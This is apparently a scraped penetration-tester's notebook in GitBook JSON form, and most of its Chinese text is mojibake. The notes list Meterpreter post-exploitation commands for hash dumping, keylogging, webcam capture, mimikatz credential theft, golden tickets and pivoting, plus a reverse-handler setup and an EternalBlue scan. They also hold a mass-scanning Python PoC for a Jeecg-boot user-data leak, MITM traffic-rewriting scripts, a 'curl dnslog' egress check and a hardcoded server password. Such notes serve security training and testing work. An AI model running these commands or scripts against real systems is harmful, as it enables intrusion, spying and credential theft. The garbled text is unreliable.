è®¾ç½®çš„payloadè¦ä¸€è‡´ï¼Œä¸ç„¶è¿ä¸ä¸Š set LHOST Kaliçš„IP set LPORT Kaliç›‘å¬ç«¯å£ run Meterpreter å¸¸ç”¨å‘½ä»¤ pwdã€lsã€cd getuid # æŸ¥çœ‹å½“å‰æƒé™ getsystem # è·å¾—ç³»ç»Ÿç®¡ç†å‘˜æƒé™ï¼ˆè¦æœ¬åœ°ç®¡ç†å‘˜æƒé™è¿è¡Œï¼‰ hashdump # æŠ“å“ˆå¸Œå¯†ç  sysinfo # æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ idletim # æŸ¥çœ‹ç›®æ ‡ç³»ç»Ÿå·²è¿è¡Œæ—¶é—´ route # æŸ¥çœ‹ç›®æ ‡æœºå®Œæ•´ç½‘ç»œè®¾ç½® shell # è¿›å…¥ç›®æ ‡æœºshellï¼Œexité€€å‡ºshe background # å°†meterpreteréšè—åœ¨åå° upload ./1.txt c:\\\\1.txt # ä¸Šä¼ æ–‡ä»¶ download c:\\1.txt ./ # ä¸‹è½½æ–‡ä»¶ search -f *.txt -d c:// # æœç´¢æ–‡ä»¶ keyscan_start # å¯åŠ¨é”®ç›˜è®°å½• keyscan_stop # åœæ­¢é”®ç›˜è®°å½• keyscan_dump # è½¬å‚¨é”®ç›˜è®°å½•çš„å†…å®¹ screenshot # æŠ“å–æˆªå± webcam_list # æ‘„åƒå¤´åˆ—è¡¨ webcam_snap # æ‘„åƒå¤´æ‹ç…§ webcam_stream # æŠ“å–è§†é¢‘ è¿›ç¨‹è¿ç§» ps | grep \"explore\" migrate pid # å°†shellè¿ç§»åˆ°explorer.exeè¿›ç¨‹ä¸­ ä¼šè¯ç®¡ç† background # å°†å½“å‰ä¼šè¯æ”¾ç½®åå° sessions # ä¼šè¯ç®¡ç† sessions -l # åˆ—å‡ºæ‰€æœ‰ä¼šè¯ sessions -K # ç»ˆæ­¢æ‰€æœ‰ä¼šè¯ sessions -i id # è¿›å…¥æŸä¸ªä¼šè¯ ä¼šè¯æ´¾ç”Ÿåˆ°CS CSåˆ›å»ºç›‘å¬å™¨ MSF background use exploit/windows/local/payload_inject set lhost 192.168.32.102 set lport 9999 set DisablePayloadHandler True set PrependMigrate True sessions -l set session 1 run æ²¡æˆåŠŸï¼Œå¼¹äº†ä¸ªè®°äº‹æœ¬ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ mimikatz load kiwi creds_allï¼šåˆ—ä¸¾æ‰€æœ‰å‡­æ® creds_kerberosï¼šåˆ—ä¸¾æ‰€æœ‰kerberoså‡­æ® creds_msvï¼šåˆ—ä¸¾æ‰€æœ‰msvå‡­æ® creds_sspï¼šåˆ—ä¸¾æ‰€æœ‰sspå‡­æ® creds_tspkgï¼šåˆ—ä¸¾æ‰€æœ‰tspkgå‡­æ® creds_wdigestï¼šåˆ—ä¸¾æ‰€æœ‰wdigestå‡­æ® dcsyncï¼šé€šè¿‡DCSyncæ£€ç´¢ç”¨æˆ·å¸æˆ·ä¿¡æ¯ dcsync_ntlmï¼šé€šè¿‡DCSyncæ£€ç´¢ç”¨æˆ·å¸æˆ·NTLMæ•£åˆ—ã€SIDå’ŒRID golden_ticket_createï¼šåˆ›å»ºé»„é‡‘ç¥¨æ® kerberos_ticket_listï¼šåˆ—ä¸¾kerberosç¥¨æ® kerberos_ticket_purgeï¼šæ¸…é™¤kerberosç¥¨æ® kerberos_ticket_useï¼šä½¿ç”¨kerberosç¥¨æ® lsa_dump_samï¼šdumpå‡ºlsaçš„SAM lsa_dump_secretsï¼šdumpå‡ºlsaçš„å¯†æ–‡ password_changeï¼šä¿®æ”¹å¯†ç  wifi_listï¼šåˆ—å‡ºå½“å‰ç”¨æˆ·çš„wifié…ç½®æ–‡ä»¶ wifi_list_sharedï¼šåˆ—å‡ºå…±äº«wifié…ç½®æ–‡ä»¶/ç¼–ç  è°ƒç”¨mimikatz åœ¨å®‰è£…äº†KB2871997è¡¥ä¸æˆ–è€…ç³»ç»Ÿç‰ˆæœ¬å¤§äºwindows server 2012æ—¶ï¼Œç³»ç»Ÿçš„å†…å­˜ä¸­å°±ä¸å†ä¿å­˜æ˜æ–‡çš„å¯†ç ï¼Œè¿™æ ·åˆ©ç”¨mimikatzå°±ä¸èƒ½ä»å†…å­˜ä¸­è¯»å‡ºæ˜æ–‡å¯†ç äº†ã€‚mimikatzçš„ä½¿ç”¨éœ€è¦administratorç”¨æˆ·æ‰§è¡Œï¼Œadministratorsä¸­çš„å…¶ä»–ç”¨æˆ·éƒ½ä¸è¡Œã€‚ mimikatzå‘½ä»¤ kiwi_cmd module::xxx kiwi_cmd sekurlsa::wdigest kiwi_cmd sekurlsa::logonpasswod ç«¯å£è½¬å‘ portfwd add -l 6666 -p 3389 -r 127.0.0.1 #å°†ç›®æ ‡æœºçš„3389ç«¯å£è½¬å‘åˆ°æœ¬åœ°6666ç«¯å£ éš§é“ä»£ç† run autoroute -s 192.168.52.0/24 # ä¸ºå½“å‰sesisonæ·»åŠ è·¯ç”± background use auxiliary/server/socks_proxy # socks5ä»£ç† set SRVHOST 127.0.0.1 run é…ç½®proxychainsä½¿ç”¨è¯¥socks5ä»£ç† æ°¸æ’ä¹‹è“ auxiliary/scanner/smb/smb_ms17_010 # æ‰«ææ¨¡å— search exploit ms17_010 # æŸ¥æ‰¾exp æ›´å¤š MSFæ¸—é€å¸¸ç”¨æ“ä½œæŒ‡å— - è·³è·³ç³– (tttang.com) Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-29 20:09:48 "},"04.å·¥å…·ä½¿ç”¨/03.æŠ“åŒ…å·¥å…·.html":{"url":"04.å·¥å…·ä½¿ç”¨/03.æŠ“åŒ…å·¥å…·.html","title":"03.æŠ“åŒ…å·¥å…·","keywords":"","body":"YAKIT MITMæµç¨‹ https://mp.weixin.qq.com/s?__biz=Mzk0MTM4NzIxMQ==&mid=2247525424&idx=1&sn=8b545e6944b395e31bed96ee13d491e0&chksm=c39c24c90b2cfd9679b955a37131f78ffbfff315a1c4ede23564577047970a4c452ad4fd936a&scene=126&sessionid=1733387743#rd æµè§ˆå™¨è¯·æ±‚ â†’ è¿‡æ»¤å™¨ â†’ è¯·æ±‚å†…å®¹è§„åˆ™å¤„ç† â†’ çƒ­åŠ è½½hijackRequestæ–¹æ³• â†’ Yakitè¯·æ±‚åŠ«æŒ â†’ çƒ­åŠ è½½beforeRequestæ–¹æ³• â†’ æœåŠ¡å™¨æ¥æ”¶è¯·æ±‚ â†’ è¿‡æ»¤å™¨ â†’ çƒ­åŠ è½½hijackResponseæ–¹æ³•â†’ å¤„ç†å“åº”è§„åˆ™å¤„ç†â†’ Yakitå“åº”åŠ«æŒâ†’ çƒ­åŠ è½½afterRequestæ–¹æ³•â†’ å“åº”å†…å®¹è§„åˆ™å¤„ç† â†’ çƒ­åŠ è½½hijackSaveHTTPFlowæ–¹æ³• â†’ æµé‡è¿›å…¥æ•°æ®åº“ï¼ˆHistoryï¼‰ è§„åˆ™å¤„ç†ï¼šHAE + Match And Replace beforeRequest ç¼–å†™è¯·æ±‚åŠ å¯† afterRequest åœ¨Web Fuzzerçš„çƒ­åŠ è½½ä¸­ç¼–å†™å“åº”è§£å¯†ï¼Œåœ¨MITMä¸­çš„è¯ä¼šå¯¼è‡´æµè§ˆå™¨æ”¶åˆ°çš„æ˜¯æ˜æ–‡ä¸èƒ½æ­£å¸¸è§£å¯†å¯†æ–‡ä»è€Œä¸æ˜¾ç¤ºæ•°æ® hijackSaveHTTPFlow å“åº”æ˜¯åŠ å¯†çš„ï¼Œå¦‚æœæƒ³åœ¨yakitçš„å“åº”åŒ…é¢æ¿çœ‹åˆ°è§£å¯†æ˜æ–‡ï¼Œè€Œæµè§ˆå™¨èƒ½å¤Ÿæ­£å¸¸æ˜¾ç¤ºæ•°æ®ï¼ˆæ¥æ”¶å¯†æ–‡è§£å¯†ï¼‰ï¼Œå°±éœ€è¦åœ¨hijackSaveHTTPFlowä¸­è¿›è¡Œç¼–å†™å¤„ç†ï¼Œè¿™é‡Œå¤„ç†çš„æ˜¯é•œåƒæµé‡ç”¨äºå­˜å‚¨åˆ°æ•°æ®åº“ä¸­ HAEè§„åˆ™è½¬æ¢ https://github.com/youmulijiang/HaeToYakit â€‹ çƒ­åŠ è½½ä»£ç  çƒ­åŠ è½½ä»£ç ç¤ºä¾‹ POSTè¯·æ±‚è½¬æ–‡ä»¶ä¸Šä¼ æ ¼å¼ // æ·»åŠ è¯·æ±‚å¤´ req = poc.AppendHTTPPacketHeader(req, \"AAA\", \"BBB\") // ä¿®æ”¹è¯·æ±‚å¤´ req = poc.ReplaceHTTPPacketHeader(req, \"User-Agent\", \"123\") if str.Contains(string(req), \"Chromium\") { modified = str.ReplaceAll(string(req), \"Chromium\", \"aaaa\") forward(poc.FixHTTPRequest(modified)) } aes_cbc = func(password){ key = \"1234567890123456\" iv = \"1234567890123456\" //è½¬åŒ–ä¸ºjsonå­—ç¬¦ä¸² tmp = {\"username\":\"admin\",\"password\":password} data = json.dumps(tmp) // aesåŠ å¯† enc_data = codec.EncodeBase64(codec.AESCBCEncryptWithPKCS7Padding(key, data, iv)~) // // è½¬æ¢æˆè¯·æ±‚åŒ…ä¸­çš„æ ¼å¼ // enc_data = codec.EncodeUrl(enc_data) // key = codec.DecodeBase64(\"+a0DokJ61de8c+F234PuCw==\")~ // // ä¼ è¾“çš„iv\"aes_iv\":\"8uPC+AA23lY\\/1LNCuXBERg==\"ï¼Œè¿™é‡Œä¼ çš„/\\å°±æ˜¯è½¬ä¹‰å­—ç¬¦+\\ // iv = codec.DecodeBase64(`8uPC+AA23lY/1LNCuXBERg==`)~ // //è½¬åŒ–ä¸ºjsonå­—ç¬¦ä¸² // tmp = {\"username\":\"admin\",\"password\":password} // data = json.dumps(tmp) // // aesåŠ å¯† // enc_data = codec.EncodeBase64(codec.AESCBCEncryptWithPKCS7Padding(key, data, iv)~) return enc_data } rsa = func(password){ pub_key=`-----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDRvA7giwinEkaTYllDYCkzujvi NH+up0XAKXQot8RixKGpB7nr8AdidEvuo+wVCxZwDK3hlcRGrrqt0Gxqwc11btlM DSj92Mr3xSaJcshZU8kfj325L8DRh9jpruphHBfh955ihvbednGAvOHOrz3Qy3Cb ocDbsNeCwNpRxwjIdQIDAQAB -----END PUBLIC KEY-----` //è½¬åŒ–ä¸ºjsonå­—ç¬¦ä¸² tmp = {\"username\":\"admin\",\"password\":password} data = json.dumps(tmp) //rsaåŠ å¯† enc_data = codec.EncodeBase64(codec.RSAEncryptWithPKCS1v15(pub_key, data)~) return enc_data } aes_rsa_enc_key = func(param){ pub_key = `-----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDRvA7giwinEkaTYllDYCkzujvi NH+up0XAKXQot8RixKGpB7nr8AdidEvuo+wVCxZwDK3hlcRGrrqt0Gxqwc11btlM DSj92Mr3xSaJcshZU8kfj325L8DRh9jpruphHBfh955ihvbednGAvOHOrz3Qy3Cb ocDbsNeCwNpRxwjIdQIDAQAB -----END PUBLIC KEY-----` key = \"1234567890123456\" enc_key= codec.EncodeBase64(codec.RSAEncryptWithPKCS1v15(pub_key, codec.EncodeBase64(key))~) return enc_key } aes_rsa_enc_iv = func(param){ pub_key = `-----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDRvA7giwinEkaTYllDYCkzujvi NH+up0XAKXQot8RixKGpB7nr8AdidEvuo+wVCxZwDK3hlcRGrrqt0Gxqwc11btlM DSj92Mr3xSaJcshZU8kfj325L8DRh9jpruphHBfh955ihvbednGAvOHOrz3Qy3Cb ocDbsNeCwNpRxwjIdQIDAQAB -----END PUBLIC KEY-----` iv = \"1234567890123456\" enc_iv= codec.EncodeBase64(codec.RSAEncryptWithPKCS1v15(pub_key, codec.EncodeBase64(iv))~) return enc_iv } Burp BurpBounty--è‡ªå®šä¹‰Payloadæµ‹è¯• https://burpbounty.net/documentation-extension/#elementor-toc__heading-anchor-10 Param urlï¼šGETè¯·æ±‚å‚æ•°å€¼ Param name urlï¼šGETè¯·æ±‚å‚æ•° Entire bodyï¼šPOSTè¯·æ±‚ä½“ Param jsonï¼šjsoné”®å€¼ ä¸­æ–‡ä¹±ç  User options â€“Display â€“ HTTP Message Display â€“ Change font ï¼Œä¸­æ–‡å­—ä½“+UTF-8ç¼–ç  Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-24 20:55:43 "},"04.å·¥å…·ä½¿ç”¨/04.gogo.html":{"url":"04.å·¥å…·ä½¿ç”¨/04.gogo.html","title":"04.gogo","keywords":"","body":"å•ä¸€ipç«¯å£æ‰«æ gogo -i ip -p info -t 100 -ev gogo -i ip -p - -t 100 -ev// å…¨ç«¯å£ gogo -i ip -p top2,top3 -t 100 -ev // å¤–ç½‘å¸¸è§ç«¯å£ æŒ‡çº¹è¯†åˆ« -v æ¼æ´æ¢æµ‹ -e è¾“å‡ºæ–‡ä»¶ --af // ä¿å­˜ç»“æœ --hf // æ–‡ä»¶åæ··æ·† é»˜è®¤è¾“å‡ºæ–‡ä»¶æ˜¯é€šè¿‡deflateæµå¼å‹ç¼©ï¼Œéœ€è¦ä½¿ç”¨-Få‚æ•°è¿›è¡Œæ ¼å¼åŒ– ./gogo -F /home/ubuntu/tools/.10.10.11.35_-_default_jl.dat Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-24 20:56:04 "},"04.å·¥å…·ä½¿ç”¨/05.è¾…åŠ©å·¥å…·.html":{"url":"04.å·¥å…·ä½¿ç”¨/05.è¾…åŠ©å·¥å…·.html","title":"05.è¾…åŠ©å·¥å…·","keywords":"","body":"selistener ç›‘å¬ç«¯å£èŒƒå›´8000-8888 selistener -ps 8000 -pe 8888 -t token ç›‘å¬ç«¯å£åˆ—è¡¨ selistener -pn 8888,8080 -t token webé¡µé¢ï¼ˆé»˜è®¤65535ç«¯å£ï¼‰è¿›è¡ŒæŸ¥è¯¢ wordså‚æ•°ï¼Œæ ¹æ®å†…å®¹æŸ¥è¯¢è¯·æ±‚ï¼Œexp: words=/index ipå‚æ•°ï¼Œæ ¹æ®ipæŸ¥è¯¢è¯·æ±‚ï¼Œexp: ip=127.0.0.1 portå‚æ•°ï¼Œæ ¹æ®ç«¯å£æŸ¥è¯¢è¯·æ±‚ï¼Œexp: port=8081 protocolå‚æ•°ï¼Œæ ¹æ®åè®®æŸ¥è¯¢è¯·æ±‚ï¼Œexp: protocol=http gohttpserver gohttpserver -r ./ --addr 0.0.0.0:8000 --upload --auth-type http --auth-http bdiasudiaubd:&*%^FTF%%^ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-24 21:07:21 "},"05.ç¼–ç¨‹å¼€å‘/Python/POCæ¨¡æ¿.html":{"url":"05.ç¼–ç¨‹å¼€å‘/Python/POCæ¨¡æ¿.html","title":"POCç¼–å†™","keywords":"","body":"å•ä¸ªPOCæ¨¡æ¿ import os import time from urllib import response from urllib.parse import urljoin from weakref import proxy import requests from threading import Lock from concurrent.futures import ThreadPoolExecutor from argparse import ArgumentParser from colorama import init from colorama import Fore init(autoreset=True) requests.packages.urllib3.disable_warnings() class POC: def __init__(self): self.banner() self.args = self.parseArgs() if self.args.file: self.init() self.urlList = self.loadURL() self.multiRun() self.start = time.time() else: self.verfyurl() def banner(self): logo = r\"\"\" .__ ____ ___ ________ _____ ______ | | ____ _/ __ \\\\ \\/ /\\__ \\ / \\\\____ \\| | _/ __ \\ \\ ___/ > > |_\\ ___/ \\___ >__/\\_ \\(____ /__|_| / __/|____/\\___ > \\/ \\/ \\/ \\/|__| \\/ authorï¼š Khaz GitHubï¼š https://github.com/Khaz \"\"\" print(\"\\033[91m\" + logo + \"\\033[0m\") def parseArgs(self): date = time.strftime(\"%Y-%m-%d_%H-%M-%S\", time.localtime()) parser = ArgumentParser() parser.add_argument(\"-u\", \"--url\", required=False, type=str, help=\"Target url(e.g. http://127.0.0.1)\") parser.add_argument(\"-f\", \"--file\", required=False, type=str, help=f\"Target file(e.g. url.txt)\") parser.add_argument(\"-t\", \"--thread\", required=False, type=int, default=5, help=f\"Number of thread (default 5)\") parser.add_argument(\"-T\", \"--timeout\", required=False, type=int, default=3, help=\"Request timeout (default 3)\") parser.add_argument(\"-o\", \"--output\", required=False, type=str, default=date, help=f\"Vuln url output file (e.g. result.txt)\") parser.add_argument(\"-p\", \"--proxy\", default=None, help=\"Request Proxy (e.g http://127.0.0.1:8080)\") return parser.parse_args() def proxy_server(self): proxy = self.args.proxy return proxy # åˆå§‹åŒ–è„šæœ¬é…ç½® def init(self): print(\"\\nthread:\", self.args.thread) print(\"timeout:\", self.args.timeout) msg = \"\" if os.path.isfile(self.args.file): msg += \"Load url file successfully\\n\" else: msg += f\"\\033[31mLoad url file {self.args.file} failed\\033[0m\\n\" print(msg) if \"failed\" in msg: print(\"Init failed, Please check the environment.\") os._exit(0) print(\"Init successfully\") # è¿”å›pocçš„è¿”å›åŒ… def respose(self, url): proxy = self.args.proxy proxies = None if proxy: proxies = {\"http\": proxy, \"https\": proxy} path = \"/jeecg-boot/sys/user/querySysUser?username=admin\" url = urljoin(url, path) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\", } try: response = requests.post(url, headers=headers, proxies=proxies, timeout=self.args.timeout, verify=False, allow_redirects=False) resp = response.text return resp except: return \"conn\" # å•æ¡urlæ£€æµ‹ def verfyurl(self): url = self.args.url repData = self.respose(url) if \"\\\"username\\\":\\\"admin\\\"\" in repData: print(Fore.GREEN +\"[+] æ¼æ´å­˜åœ¨ï¼ï¼ï¼[+] url: {}\".format(url)) elif \"conn\" in repData: print(\"[-] URLè¿æ¥å¤±è´¥ï¼ [-] url: {}\".format(url)) else: print(\"[x] æœªæ£€æµ‹åˆ°æ¼æ´ï¼[x] url: {}\".format(url)) # å¤šæ¡urlæ£€æµ‹ def verify(self, url): repData = self.respose(url) if \"\\\"username\\\":\\\"admin\\\"\" in repData: msg = Fore.GREEN +\"[+] æ¼æ´å­˜åœ¨ï¼ï¼ï¼[+] url: {}\".format(url) self.lock.acquire() try: self.findCount +=1 self.vulnRULList.append(url) finally: self.lock.release() elif \"conn\" in repData: msg = \"[-] URLè¿æ¥å¤±è´¥ï¼ [-] url: {}\".format(url) else: msg = \"[x] æœªæ£€æµ‹åˆ°æ¼æ´ï¼[x] url: {}\".format(url) self.lock.acquire() try: print(msg) finally: self.lock.release() # å¯¼å…¥æ–‡ä»¶ä¸­çš„url def loadURL(self): urlList = [] with open(self.args.file, encoding=\"utf8\") as f: for u in f.readlines(): u = u.strip() urlList.append(u) return urlList # å¤šçº¿ç¨‹ def multiRun(self): self.findCount = 0 self.vulnRULList = [] self.lock = Lock() executor = ThreadPoolExecutor(max_workers=self.args.thread) if self.args.url: executor.map(self.verify, self.url) else: executor.map(self.verify, self.urlList) # ä¿å­˜ç»“æœ def output(self): if not os.path.isdir(r\"./output\"): os.mkdir(r\"./output\") self.outputFile = f\"./output/{self.args.output}.txt\" with open(self.outputFile, \"a\") as f: for url in self.vulnRULList: f.write(url + \"\\n\") # ç»“æœç»Ÿè®¡è¾“å‡º def __del__(self): try: print(\"\\nAlltCountï¼š\\033[31m%d\\033[0m\\nVulnCountï¼š\\033[32m%d\\033[0m\" % (len(self.urlList), self.findCount)) self.end = time.time() print(\"Time Spent: %.2f\" % (self.end - self.start)) self.output() print(\"-\" * 20, f\"\\nThe vulnURL has been saved in {self.outputFile}\\n\") except: pass if __name__ == \"__main__\": POC() æ–‡ä»¶ä¸Šä¼ poc JSP é€šè¿‡è°ƒç”¨application.getRealPath(request.getServletPath())æ¥è·å–å½“å‰è¯·æ±‚çš„Servletè·¯å¾„ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºçœŸå®çš„æ–‡ä»¶è·¯å¾„ã€‚ç„¶åï¼Œä½¿ç”¨new File()æ¥åˆ›å»ºä¸€ä¸ªè¡¨ç¤ºè¯¥æ–‡ä»¶çš„Fileå¯¹è±¡ï¼Œå¹¶è°ƒç”¨.delete()æ–¹æ³•æ¥åˆ é™¤è¯¥æ–‡ä»¶ã€‚ PHP å‘½ä»¤æ‰§è¡ŒPOC echo $((8#77777)) # æœ‰å›æ˜¾æ£€æµ‹32767 curl dnslog # èƒ½å‡ºç½‘æ£€æµ‹dnslog æ–‡ä»¶ä¸Šä¼  å‡è®¾ä¸Šä¼ æ–‡ä»¶çš„è¡¨å•å¦‚ä¸‹ å¯¹åº”è„šæœ¬ import requests url = 'http://e1c9d16a-1928-4d06-8480-e770e3b7a0a8.node4.buuoj.cn:81' # { name : (æ–‡ä»¶å,æ–‡ä»¶å†…å®¹ï¼Œæ–‡ä»¶MIME) } å°†æ–‡ä»¶ä¿¡æ¯å¡«å…¥å…ƒç»„ï¼ˆï¼‰ä¸­ï¼Œåªæœ‰æ–‡ä»¶å†…å®¹æ˜¯å¿…é€‰çš„ã€‚ # ä¸Šä¼ æœ¬åœ°æ–‡ä»¶ files = {\"file\": (\"sess\", open('D:\\phpstudy_pro\\phpstudy_pro\\Extensions/tmp/tmp/sess_t6c3cbbvj9p0k6njfkso5kmddr', 'rb'))} # ç›´æ¥ä¸Šä¼ æ–‡ä»¶å†…å®¹å­—ç¬¦ä¸²ï¼ˆæ³¨æ„è¦ç”¨äºŒè¿›åˆ¶ï¼‰ # files = {\"file\": (\"sess\", b'\\x08usernames:5:\"admin\";')} data = { 'direction':'upload', 'attr':'' } res = requests.post(url, data=data ,files=files) é…åˆburpæŠ“åŒ… pro = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080' } # verify=Falseä¸é‰´åˆ«burpçš„sslè¯ä¹¦ï¼Œå¦åˆ™æ— æ³•ä»£ç†https requests.get(url=url,proxies=pro, verify=False) è„šæœ¬å‚æ•° python xx.py aa sys.argv[0]â†’xx.py sys.argv[1]â†’aa import argparse parser = argparse.ArgumentParser() parser.add_argument(\"-u\",\"--url\", type=str, help=\"target url\") parser.add_argument(\"-t\", \"--threads\" , type=int, help=\"threads num\") args = parser.parse_args() >> python xx.py -u xx.com -t 20 args.url=xx.com args.threads=20 å¤šçº¿ç¨‹ import requests from concurrent.futures import ThreadPoolExecutor, as_completed f= open('./host.txt','w') def get(url): res = requests.get(url=url) if res.status_code == 200: f.write(url+\"\\n\") if __name__ == '__main__': urls=[] for i in range(0,500): urls.append('http://192-168-1-{}.pvp2039.bugku.cn'.format(i)) with ThreadPoolExecutor(max_workers=50) as pool: # æäº¤ä»»åŠ¡ futures = [pool.submit(get,url) for url in urls] # ç­‰å¾…æ‰€æœ‰ä»»åŠ¡å®Œæˆ for future in as_completed(futures): result = future.result() if result: print(result) import requests import threading # è®¾ç½®æœ€å¤§å¹¶å‘æ•°é‡ä¸º20 max_concurrent = threading.BoundedSemaphore(20) def worker(url): \"\"\"çº¿ç¨‹æ‰§è¡Œçš„å‡½æ•°\"\"\" with max_concurrent: try: response = requests.get(url, verify=False, timeout=3) except: pass if __name__ == \"__main__\": # åˆ›å»ºå¹¶å¯åŠ¨çº¿ç¨‹ threads = [] with open('result.txt') as f: for url in f: url = url.replace(\"\\n\", \"\") thread = threading.Thread(target=worker, args=(url,)) thread.start() threads.append(thread) # ç­‰å¾…æ‰€æœ‰çº¿ç¨‹ç»“æŸ for thread in threads: thread.join() å…³é—­sslå‘Šè­¦ import warnings from urllib3.exceptions import InsecureRequestWarning # ç¦ç”¨è­¦å‘Š warnings.simplefilter('ignore', category=InsecureRequestWarning) é¢œè‰²å˜åŒ– from colorama import init from colorama import Fore init(autoreset=True) print(Fore.GREEN + f\"[+]{url}å­˜åœ¨æ¼æ´ï¼ï¼ï¼ï¼\") JSON åŠ è½½ä¸è§£ç JSONæ•°æ®ï¼š json.loads()å‡½æ•°å¯ä»¥å°†JSONå­—ç¬¦ä¸²è§£æä¸ºPythonå¯¹è±¡ã€‚ json.load()å‡½æ•°å¯ä»¥ä»æ–‡ä»¶ä¸­è¯»å–JSONæ•°æ®å¹¶è§£æä¸ºPythonå¯¹è±¡ã€‚ ç¼–ç ä¸ä¿å­˜JSONæ•°æ®ï¼š json.dumps()å‡½æ•°å¯ä»¥å°†Pythonå¯¹è±¡è½¬æ¢ä¸ºJSONæ ¼å¼çš„å­—ç¬¦ä¸²ã€‚ json.dump()å‡½æ•°å¯ä»¥å°†Pythonå¯¹è±¡è½¬æ¢ä¸ºJSONæ ¼å¼çš„å­—ç¬¦ä¸²å¹¶å†™å…¥æ–‡ä»¶ã€‚ æ“ä½œä¸è®¿é—®JSONæ•°æ®ï¼š è§£æåçš„JSONæ•°æ®ä¼šè¢«è½¬æ¢ä¸ºç›¸åº”çš„Pythonæ•°æ®ç±»å‹ï¼Œå¦‚å­—å…¸ã€åˆ—è¡¨ç­‰ï¼Œå¯ä»¥åƒæ“ä½œæ™®é€šPythonå¯¹è±¡ä¸€æ ·å¯¹å…¶è¿›è¡Œè®¿é—®å’Œæ“ä½œã€‚ å¤„ç†ç‰¹æ®Šæƒ…å†µï¼š json.JSONEncoderç±»å¯ä»¥è‡ªå®šä¹‰JSONç¼–ç å™¨ï¼Œä»¥å¤„ç†ç‰¹æ®Šæ•°æ®ç±»å‹æˆ–å¯¹è±¡çš„ç¼–ç ã€‚ json.JSONDecoderç±»å¯ä»¥è‡ªå®šä¹‰JSONè§£ç å™¨ï¼Œä»¥å¤„ç†ç‰¹æ®Šçš„JSONæ•°æ®æ ¼å¼æˆ–ç‰¹å®šéœ€æ±‚ã€‚ å…¶ä»– url = urljoin(url, path) é—®é¢˜ requests.exceptions.TooManyRedirects: Exceeded 30 redirects. allow_redirects=False ä½¿ç”¨.format å­—ç¬¦ä¸²é‡ŒåŸæœ¬å°±æœ‰{}æ—¶ç”¨å…¶ä»–çš„å­—ç¬¦ä¸²æ ¼å¼åŒ– f\"{xx}\" f\"%s\" % xx Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-10-27 17:13:13 "},"05.ç¼–ç¨‹å¼€å‘/Python/pythonå‘½åç©ºé—´.html":{"url":"05.ç¼–ç¨‹å¼€å‘/Python/pythonå‘½åç©ºé—´.html","title":"pythonå‘½åç©ºé—´","keywords":"","body":"Fromï¼šhttps://www.bilibili.com/video/BV12F411t78n å¼€å¤´è¯´äº†ä¸€æ®µè¯ lf you import another module, it will have its global scope æ¯ä¸ªæ¨¡å—éƒ½æœ‰è‡ªå·±çš„å…¨å±€ç©ºé—´ Each function has its local scope æ¯ä¸ªå‡½æ•°éƒ½æœ‰è‡ªå·±çš„å±€éƒ¨ç©ºé—´ Every time the function is called, a new scope is created æ¯å½“å‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œå°±ä¼šåˆ›å»ºä¸€ä¸ªç©ºé—´ç»™å®ƒä½¿ç”¨ Certain Python objects like 'print' function, 'None','True', 'False', are available everywhere in your program and they are in the built-in scope pythonå†…ç½®çš„å‡½æ•°åœ¨ç¨‹åºçš„ä»»ä½•ä¸€ä¸ªç©ºé—´éƒ½æ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œå®ƒä»¬å­˜åœ¨äºbuilt-inç©ºé—´ä¸­ã€‚ The variables or name bindings are stored in namespaces å˜é‡å’Œå‡½æ•°åœ°å€éƒ½å­˜å‚¨åœ¨å‘½åç©ºé—´ä¸­ è¿™æ˜¯æˆ‘æ ¹æ®è§†é¢‘çš„ç”»çš„ï¼Œå·¦è¾¹çš„globalç©ºé—´æ˜¯socketæ¨¡å—çš„ï¼Œå³è¾¹çš„globalç©ºé—´æ˜¯æˆ‘ä»¬ç¨‹åºçš„ï¼ˆæˆ‘ç»™å®ƒèµ·äº†å«originalï¼‰ æ‰€ä»¥æˆ‘ä»¬çš„ç¨‹åºå¤„åœ¨orginalé‡Œï¼Œæ‰€ä»¥æƒ³ç”¨socketæ¨¡å—ä¸­çš„æ–¹æ³•å°±å¿…é¡»ç”¨.æ¥è®¿é—® import socket #åˆ›å»ºTCP/IPå¥—æ¥å­— tcpSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #åˆ›å»ºUDP/IPå¥—æ¥å­— udpSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) ä½†æ˜¯æˆ‘ä»¬åƒä¸‹é¢è¿™æ ·å†™ï¼Œå°±ç›¸å½“äºæŠŠsocketæ¨¡å—å¯¼å…¥åˆ°æˆ‘ä»¬çš„å‘½åç©ºé—´originalä¸­ï¼Œå°±å¯ä»¥ç›´æ¥è°ƒç”¨æ–¹æ³•äº† from socket import * #åˆ›å»ºTCP/IPå¥—æ¥å­— tcpSock = socket(AF_INET, SOCK_STREAM) #åˆ›å»ºUDP/IPå¥—æ¥å­— udpSock = socket(AF_INET, SOCK_DGRAM) ä»€ä¹ˆéƒ½æ²¡æœ‰çš„py def test(): a=10 print(locals())#æŸ¥çœ‹testå‡½æ•°æ‰€åœ¨çš„localç©ºé—´ print(globals())#æŸ¥çœ‹globalç©ºé—´ print(\"\\n\") test() print(\"\\n\") 